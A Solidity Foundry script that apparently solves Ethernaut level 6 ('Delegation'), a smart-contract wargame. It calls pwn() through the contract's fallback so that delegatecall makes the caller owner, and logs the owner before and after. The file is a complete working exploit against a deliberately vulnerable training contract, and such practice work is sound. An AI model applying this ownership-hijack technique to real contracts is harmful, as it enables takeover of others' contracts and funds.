//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "lib/forge-std/src/Script.sol";
import {Delegation} from "src/ethernaut6.sol";
import {console} from "lib/forge-std/src/console.sol";

contract ethernaut6Script is Script{
    Delegation instance = Delegation(0x77BAdD4BA7e3481BF3516339295f031ac0384212);
    function run() public{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("owner: ", instance.owner());
        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool success,) = address(instance).call(data);
        require(success, "pwn failed");
        console.log("owner: ", instance.owner());

        vm.stopBroadcast();
    }
}
